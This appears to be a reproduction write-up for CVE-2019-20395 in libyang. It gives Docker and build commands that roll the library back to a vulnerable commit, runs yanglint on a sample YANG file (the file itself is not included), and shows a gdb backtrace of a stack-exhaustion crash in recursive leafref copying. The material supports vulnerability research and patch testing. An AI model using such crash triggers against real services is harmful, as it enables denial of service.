### CVE-2019-20395

### PoC Links
[Github.com](https://github.com/CESNET/libyang/issues/724)

### Docker Container Run Command
```shell
docker build -t cve-2019-20395-poc .
docker run --privileged --cap-add sys_ptrace  --security-opt seccomp=unconfined -itd --name CVE-2019-20395-POC cve-2019-20395-poc
docker exec -it CVE-2019-20395-POC /bin/bash
```

### PoC Reproduce Command
```shell
# Preparing the initial environment
apt-get update -y
apt-get install git -y

# Configure local SSH for Github and clone the repository. (ssh-keygen)
cd /poc
git clone git@github.com:CESNET/libyang.git

# Rollback to the vulnerable version.
cd libyang/
git reset --hard f2ed53653f8c343eb156170470ac49058e70c470

# Install the compilation and installation dependencies.
apt install gcc gdb make cmake libpcre3 libpcre3-dev doxygen pkg-config libtool-bin build-essential llvm-dev libunwind-dev -y

# Configure, compile, and install.
mkdir build
cd build/
cmake ..
make
make install
ldconfig

# exec the poc file.
cd /poc
yanglint -p /poc sample.yang
```

### Description
Observed that:
```shell
root@e27cf7155468:/poc# gdb yanglint
...

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from yanglint...
(gdb) r -p /poc sample.yang
Starting program: /usr/local/bin/yanglint -p /poc sample.yang
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/aarch64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
parse_node_identifier (id=0x0, mod_name=0x0, mod_name_len=<error reading variable: Cannot access memory at address 0xffffff7ffff8>, name=<error reading variable: Cannot access memory at address 0xffffff7ffff0>, nam_len=<error reading variable: Cannot access memory at address 0xffffff7fffe8>, all_desc=<error reading variable: Cannot access memory at address 0xffffff7fffe0>, extended=<error reading variable: Cannot access memory at address 0xffffff7fffdc>) at /poc/libyang/src/resolve.c:195
    195     {
        (gdb) bt
        #0  parse_node_identifier (id=0x0, mod_name=0x0,
        mod_name_len=<error reading variable: Cannot access memory at address 0xffffff7ffff8>,
            name=<error reading variable: Cannot access memory at address 0xffffff7ffff0>,
                nam_len=<error reading variable: Cannot access memory at address 0xffffff7fffe8>,
                    all_desc=<error reading variable: Cannot access memory at address 0xffffff7fffe0>,
                        extended=<error reading variable: Cannot access memory at address 0xffffff7fffdc>) at /poc/libyang/src/resolve.c:195
                            #1  0x0000fffff7e78a28 in parse_path_arg (mod=0xaaaaaaadfd60, id=0xaaaaaaad8fb1 "list5", prefix=0xffffff8000e8,
                            pref_len=0xffffff8000d0, name=0xffffff8000f0, nam_len=0xffffff8000d4, parent_times=0xffffff8000d8, has_predicate=0xffffff8000dc)
                            at /poc/libyang/src/resolve.c:658
                            #2  0x0000fffff7e82d70 in resolve_schema_leafref (type=0xaaaaaadec770, parent=0xaaaaaaaea940, unres=0xaaaaaaaebd90)
                            at /poc/libyang/src/resolve.c:4161
                            #3  0x0000fffff7e8af18 in resolve_unres_schema_item (mod=0xaaaaaaadfd60, item=0xaaaaaadec770, type=UNRES_TYPE_LEAFREF,
                            str_snode=0xaaaaaaaea940, unres=0xaaaaaaaebd90) at /poc/libyang/src/resolve.c:6832
                            #4  0x0000fffff7e8caa4 in unres_schema_add_node (mod=0xaaaaaaadfd60, unres=0xaaaaaaaebd90, item=0xaaaaaadec770,
                            type=UNRES_TYPE_LEAFREF, snode=0xaaaaaaaea940) at /poc/libyang/src/resolve.c:7435
                            #5  0x0000fffff7efcb48 in type_dup (mod=0xaaaaaaadfd60, parent=0xaaaaaaaea940, new=0xaaaaaadec770, old=0xaaaaaaaead30,
                            base=LY_TYPE_LEAFREF, in_grp=0, shallow=0, unres=0xaaaaaaaebd90) at /poc/libyang/src/tree_schema.c:1757
                            #6  0x0000fffff7efe2bc in lys_type_dup (mod=0xaaaaaaadfd60, parent=0xaaaaaaaea940, new=0xaaaaaadec770, old=0xaaaaaaaead30, in_grp=0,
                            shallow=0, unres=0xaaaaaaaebd90) at /poc/libyang/src/tree_schema.c:2240
                            #7  0x0000fffff7efd3f0 in lys_copy_union_leafrefs (mod=0xaaaaaaadfd60, parent=0xaaaaaaaea940, type=0xaaaaaaaead30,
                            prev_new=0xaaaaaadec770, unres=0xaaaaaaaebd90) at /poc/libyang/src/tree_schema.c:1911
                            #8  0x0000fffff7efd38c in lys_copy_union_leafrefs (mod=0xaaaaaaadfd60, parent=0xaaaaaaaea940, type=0xaaaaaaaee198,
                            prev_new=0xaaaaaadec720, unres=0xaaaaaaaebd90) at /poc/libyang/src/tree_schema.c:1903
                            #9  0x0000fffff7efd278 in lys_copy_union_leafrefs (mod=0xaaaaaaadfd60, parent=0xaaaaaaaea940, type=0xaaaaaaaead70,
                            prev_new=0xaaaaaadec720, unres=0xaaaaaaaebd90) at /poc/libyang/src/tree_schema.c:1887
                            #10 0x0000fffff7efd38c in lys_copy_union_leafrefs (mod=0xaaaaaaadfd60, parent=0xaaaaaaaea940, type=0xaaaaaaaee198,
                            prev_new=0xaaaaaadec690, unres=0xaaaaaaaebd90) at /poc/libyang/src/tree_schema.c:1903
                            #11 0x0000fffff7efd278 in lys_copy_union_leafrefs (mod=0xaaaaaaadfd60, parent=0xaaaaaaaea940, type=0xaaaaaaaead70,
                            prev_new=0xaaaaaadec690, unres=0xaaaaaaaebd90) at /poc/libyang/src/tree_schema.c:1887
                            #12 0x0000fffff7efd38c in lys_copy_union_leafrefs (mod=0xaaaaaaadfd60, parent=0xaaaaaaaea940, type=0xaaaaaaaee198,
                            prev_new=0xaaaaaadec600, unres=0xaaaaaaaebd90) at /poc/libyang/src/tree_schema.c:1903
                            #13 0x0000fffff7efd278 in lys_copy_union_leafrefs (mod=0xaaaaaaadfd60, parent=0xaaaaaaaea940, type=0xaaaaaaaead70,
                            prev_new=0xaaaaaadec600, unres=0xaaaaaaaebd90) at /poc/libyang/src/tree_schema.c:1887
                            #14 0x0000fffff7efd38c in lys_copy_union_leafrefs (mod=0xaaaaaaadfd60, parent=0xaaaaaaaea940, type=0xaaaaaaaee198,
                            prev_new=0xaaaaaadec570, unres=0xaaaaaaaebd90) at /poc/libyang/src/tree_schema.c:1903
                            #15 0x0000fffff7efd278 in lys_copy_union_leafrefs (mod=0xaaaaaaadfd60, parent=0xaaaaaaaea940, type=0xaaaaaaaead70,
                            prev_new=0xaaaaaadec570, unres=0xaaaaaaaebd90) at /poc/libyang/src/tree_schema.c:1887
                            #16 0x0000fffff7efd38c in lys_copy_union_leafrefs (mod=0xaaaaaaadfd60, parent=0xaaaaaaaea940, type=0xaaaaaaaee198,
                            prev_new=0xaaaaaadec4e0, unres=0xaaaaaaaebd90) at /poc/libyang/src/tree_schema.c:1903
                            #17 0x0000fffff7efd278 in lys_copy_union_leafrefs (mod=0xaaaaaaadfd60, parent=0xaaaaaaaea940, type=0xaaaaaaaead70,
                            prev_new=0xaaaaaadec4e0, unres=0xaaaaaaaebd90) at /poc/libyang/src/tree_schema.c:1887
                            --Type <RET> for more, q to quit, c to continue without paging--
```



